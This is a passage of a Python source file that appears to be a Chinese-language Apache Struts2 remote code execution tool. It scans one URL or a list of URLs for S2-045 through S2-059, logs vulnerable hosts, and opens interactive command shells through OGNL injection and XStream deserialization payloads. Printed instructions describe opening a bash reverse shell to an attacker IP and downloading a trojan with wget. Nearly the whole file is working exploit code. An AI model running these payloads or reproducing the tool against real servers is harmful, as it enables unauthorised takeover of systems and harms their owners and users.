                            # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
                            'Content-Type': str(payload),
                            'Accept': '*/*'
                        }

                        timeout = 3
                        try:
                            output = requests.get(url, headers=headers, verify=False, timeout=timeout,
                                                  allow_redirects=False).text
                        except requests.exceptions.ChunkedEncodingError:
                            try:
                                output = b""
                                with requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False,
                                                  stream=True) as resp:
                                    for i in resp.iter_content():
                                        output += i
                            except:
                                pass
                            if type(output) != str:
                                output = output.decode('utf-8')
                                a=re.sub(r'\\n','\n',output)
                                print(a)
                            return (output)

                    exploit(url1, cmd)

            else:
                print('不存在s2-045')
        else:
            print('不存在s2-045')
    except:
        print("不存在S2-045")

#s2-046
    try:
        m = url.split(':')
        #print(m)
        ip = re.sub('//', '', m[1])
        port = re.sub('/', '', m[2])

        q = b'''------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)}\x00b"
Content-Type: text/plain
    
foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\n', b'\r\n')
        p = b'''POST / HTTP/1.1
Host: 192.168.253.129:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Length: %d
    
    
'''.replace(b'\n', b'\r\n') % (len(q),)
        #print(p,q)
        with socket.create_connection((ip, port), timeout=2) as conn:
            conn.send(p + q)
            a = conn.recv(10240).decode()
            #print(a)
        if '54289' in a:
            print('--------存在s2-046--------')
            while x:
                cmd = input("shell>")
                def exploit(url, cmd):
                    payload = "%{(#_='multipart/form-data')."
                    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                    payload += "(#_memberAccess?"
                    payload += "(#_memberAccess=#dm):"
                    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
                    payload += "(#ognlUtil.getExcludedClasses().clear())."
                    payload += "(#context.setMemberAccess(#dm))))."
                    payload += "(#cmd='%s')." % cmd
                    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
                    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
                    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
                    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
                    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                    payload += "(#ros.flush())}"

                    headers = {
                        'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn)',
                        # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
                        'Content-Type': str(payload),
                        'Accept': '*/*'
                    }

                    timeout = 3
                    try:
                        output = requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False).text
                        print(11)
                    except requests.exceptions.ChunkedEncodingError:
                        try:
                            output = b""
                            with requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False,
                                              stream=True) as resp:
                                for i in resp.iter_content():
                                    output += i
                        except:
                            pass
                        if type(output) != str:
                            output = output.decode('utf-8')
                            # print(output)
                        return (output)

                print(exploit(url, cmd))

        else:
            print('不存在s2-046')
    except:
        print('不存在s2-046')

#s2-048
    try:
        if '.action' in url or '.do' in url:
            url1 = url
        else:
            url1 = url + "/integration/saveGangster.action"
        #url1="integration/saveGangster.action"
        data={'name':'${233*233}','age':'1'}
        res=requests.post(url1,data=data,timeout=2)
        #print(res.text)
        if '54289' in str(res.text):
            print('--------存在s2-048--------')
            if x==0:
                with open('./漏洞url.txt','a') as f:
                    s=url+'\n'+'"----------存在S2-048----------"'+'\n\n\n\n'
                    f.write(s)
            while x:
                cmd = input('shell>')
                c = "%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27" + cmd + "%27%29.getInputStream%28%29%29%29.%28%23q%29%7D"
                d = urllib.parse.unquote(c)
                data = {'name': d, 'age': '1'}
                res = requests.post(url1, data=data)
                #print(res.content)
                a = re.findall(r'Gangster (.*?)\\n added successfully', str(res.content))
                f = re.sub(r'\\n', '\n', str(a[0]))
                print(f)
        else:
            print('不存在s2-048')
    except:
        print('不存在s2-048')

#s2-052
    try:
        if '.action' in url or '.do' in url:
            e = re.split('/', r)
            h = re.sub(e[-1], '', url)
        else:
            h = url + '/'
        url1=h+"orders/3/edit"
        cmd='ls'
        cmd_base64=base64.b64encode(cmd.encode('utf-8'))
        headers={'Content-Type':'application/xml'}
        payload3="<string>{echo,"+str(cmd_base64,'utf-8')+"}|{base64,-d}|{bash,-i}</string>"
        payload1="""
        <map>
          <entry>
            <jdk.nashorn.internal.objects.NativeString>
              <flags>0</flags>
              <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                <dataHandler>
                  <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                    <is class="javax.crypto.CipherInputStream">
                      <cipher class="javax.crypto.NullCipher">
                        <initialized>false</initialized>
                        <opmode>0</opmode>
                        <serviceIterator class="javax.imageio.spi.FilterIterator">
                          <iter class="javax.imageio.spi.FilterIterator">
                            <iter class="java.util.Collections$EmptyIterator"/>
                            <next class="java.lang.ProcessBuilder">
                              <command>
                                <string>bash</string>
                   <string>-c</string>
        """

        payload2="""
        
                              </command>
                              <redirectErrorStream>false</redirectErrorStream>
                            </next>
                          </iter>
                          <filter class="javax.imageio.ImageIO$ContainsFilter">
                            <method>
                              <class>java.lang.ProcessBuilder</class>
                              <name>start</name>
                              <parameter-types/>
                            </method>
                            <name>foo</name>
                          </filter>
                          <next class="string">foo</next>
                        </serviceIterator>
                        <lock/>
                      </cipher>
                      <input class="java.lang.ProcessBuilder$NullInputStream"/>
                      <ibuffer></ibuffer>
                      <done>false</done>
                      <ostart>0</ostart>
                      <ofinish>0</ofinish>
                      <closed>false</closed>
                    </is>
                    <consumed>false</consumed>
                  </dataSource>
                  <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
              </value>
            </jdk.nashorn.internal.objects.NativeString>
            <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
          </entry>
          <entry>
            <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
            <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
          </entry>
        </map>
        """
        payload=payload1+payload3+payload2
        #print(payload)
        res=requests.post(url1,data=payload,headers=headers,timeout=2)
        res1=requests.post(url1,headers=headers,timeout=2)
        #print(res.status_code,res1.status_code)
        if res.status_code==500 and res1.status_code==200:
            print('--------存在s2-052--------')
            if x==0:
                with open('./漏洞url.txt','a') as f:
                    s=url+'\n'+'"----------存在S2-052----------"'+'\n\n\n\n'
                    f.write(s)
            print('------------------------------------------------------------------------------')
            print('s2-052漏洞没有回显')
            print('在自己的服务器执行：nc -lvnp 1234')
            print('请输入命令：/bin/bash -i>&/dev/tcp/192.168.142.128/1234 0>&1 （改成自己的ip和端口）')
            print('------------------------------------------------------------------------------')
            while x:
                cmd = input('shell>')
                cmd_base64 = base64.b64encode(cmd.encode('utf-8'))
                headers = {'Content-Type': 'application/xml'}
                payload3 = "<string>{echo," + str(cmd_base64, 'utf-8') + "}|{base64,-d}|{bash,-i}</string>"
                payload1 = """
                    <map>
                      <entry>
                        <jdk.nashorn.internal.objects.NativeString>
                          <flags>0</flags>
                          <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                            <dataHandler>
                              <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                                <is class="javax.crypto.CipherInputStream">
                                  <cipher class="javax.crypto.NullCipher">
                                    <initialized>false</initialized>
                                    <opmode>0</opmode>
                                    <serviceIterator class="javax.imageio.spi.FilterIterator">
                                      <iter class="javax.imageio.spi.FilterIterator">
                                        <iter class="java.util.Collections$EmptyIterator"/>
                                        <next class="java.lang.ProcessBuilder">
                                          <command>
                                            <string>bash</string>
                               <string>-c</string>
                    """

                payload2 = """
        
                                          </command>
                                          <redirectErrorStream>false</redirectErrorStream>
                                        </next>
                                      </iter>
                                      <filter class="javax.imageio.ImageIO$ContainsFilter">
                                        <method>
                                          <class>java.lang.ProcessBuilder</class>
                                          <name>start</name>
                                          <parameter-types/>
                                        </method>
                                        <name>foo</name>
                                      </filter>
                                      <next class="string">foo</next>
                                    </serviceIterator>
                                    <lock/>
                                  </cipher>
                                  <input class="java.lang.ProcessBuilder$NullInputStream"/>
                                  <ibuffer></ibuffer>
                                  <done>false</done>
                                  <ostart>0</ostart>
                                  <ofinish>0</ofinish>
                                  <closed>false</closed>
                                </is>
                                <consumed>false</consumed>
                              </dataSource>
                              <transferFlavors/>
                            </dataHandler>
                            <dataLen>0</dataLen>
                          </value>
                        </jdk.nashorn.internal.objects.NativeString>
                        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
                      </entry>
                      <entry>
                        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                      </entry>
                    </map>
                    """
                payload = payload1 + payload3 + payload2
                #print(payload)
                res = requests.post(url1, data=payload, headers=headers)
                #print(res.text)
        else:
            print('不存在s2-052')
    except:
        print('不存在s2-052')

#s2-053
    try:
        if '.action' in url or '.do' in url:
            url1 = url
        else:
            url1 = url + "/hello.action"
        #url1="hello.action"
        c="%{233*233}"
        data={"redirectUri":c}
        headers={'Content-Type':'application/x-www-form-urlencoded'}
        res=requests.post(url1,data=data,headers=headers,timeout=2)
        if b'54289' in res.content:
            print('--------存在s2-053--------')
            if x==0:
                with open('./漏洞url.txt','a') as f:
                    s=url+'\n'+'"----------存在S2-053----------"'+'\n\n\n\n'
                    f.write(s)
            while x:
                try:
                    cmd = input('shell>')
                    c = "%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27" + cmd + "%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew" + " " + "java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0D%0A"
                    d = urllib.parse.unquote(c)
                    data = {"redirectUri": d}
                    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                    res = requests.post(url1, data=data, headers=headers)
                    # print(res.content)
                    a = re.findall(r'<p>Your url: (.*?)\\n\\r\\n</p>', str(res.content))
                    b = re.sub(r'\\n', '\n', str(a[0]))
                    print(b)
                except:
                    pass
        else:
            print('不存在s2-053')
    except:
        print("不存在S2-053")

#s2-057
    try:
        cmd="echo 367568"
        e = re.split('/', url)
        h = e[0] + '//' + e[1] + e[2]
        tturl = h + "/struts2-showcase/" + "%24%7B%0A(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('" + cmd + "')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D" + "/actionChain1.action"
        res=requests.get(tturl,timeout=2)
        if b'367568' in res.content and b'echo' not in res.content:
            print("----------存在S2-057----------")
            if x==0:
                with open('./漏洞url.txt','a') as f:
                    s=url+'\n'+'"----------存在S2-057----------"'+'\n\n\n\n'
                    f.write(s)
            while x:
                cmd=input('shell>')
                tturl = h + "/struts2-showcase/" + "%24%7B%0A(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('" + cmd + "')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D" + "/actionChain1.action"
                res=requests.get(tturl)
                a=re.findall(r'struts2-showcase/(.*?) //',str(res.content))
                print(a[0])
        else:
            print("不存在S2-057")
    except:
        print("不存在S2-057")

#s2-059
    try:
        if '.action' in url or '.do' in url:
            e = re.split('/', r)
            h = re.sub(e[-1], '', url)
        else:
            h = url + '/'
        url1 = h+"?id=%25{233*233}"
        res=requests.get(url1,timeout=0.5)
        #print(res.text)
        if b'54289' in res.content:
            print("----------存在S2-059----------")
            if x==0:
                with open('./漏洞url.txt','a') as f:
                    s=url+'\n'+'"----------存在S2-059----------"'+'\n\n\n\n'
                    f.write(s)
            print('------------------------------------------------------------------------------')
            print('s2-059漏洞没有回显')
            print('下载木马')
            print('请输入命令：wget http://10.30.0.91:9090/shell.sh')
            print('------------------------------------------------------------------------------')
            while x:
                cmd=input('shell>')
                data1 = {
                    "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
                }
                data2 = {
                    "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('"+cmd+"'))}"
                }
                res1 = requests.post(h, data=data1)
                #print(res1.text)
                res2 = requests.post(h, data=data2)
                #print(res2.text)
        else:
            print("不存在S2-059")
    except:
        print("不存在S2-059")

if len(sys.argv)!=3:
    print('+--------------------------------------------------------------------------+')
    print('+ 单个URL EXP:   struts2.exe -u http://1.1.1.1:8081/                       +')
    print('+ 批量URL EXP:   struts2.exe -t xxx.txt    (xxx.txt存放被测的url)          +')
    print('+ 批量URL EXP:   存在漏洞的url会存放在新生成的：漏洞url.txt 中             +')
    print('+--------------------------------------------------------------------------+')
    print('+ Struts2   远程代码执行漏洞                                               +')
    print('+--------------------------------------------------------------------------+')
    input
else:
    h=sys.argv[1]
    if h=='-u':
        x=1
        url = sys.argv[2]
        if url[-1] == '/':
            url = url[:-1]
        if 'http' not in url:
            url='http://'+url
        poc(url, x)

    elif h=='-t':
        x=0
        t=sys.argv[2]
        try:
            with open(t,'r',encoding='utf-8') as f:
                f.readline()
        except:
            print("文件不存在或格式错误")
            sys.exit()
        with open(t,encoding='utf-8') as f:
            p=f.readlines()
        #print(p)
        for i in p:
            url=re.sub(r'\n','',str(i))

            if url[-1] == '/':
                url = url[:-1]
            if 'http' not in url:
                url = 'http://' + url
            print(url)
            poc(url, x)

    else:
        print('输入格式错误')
        sys.exit()
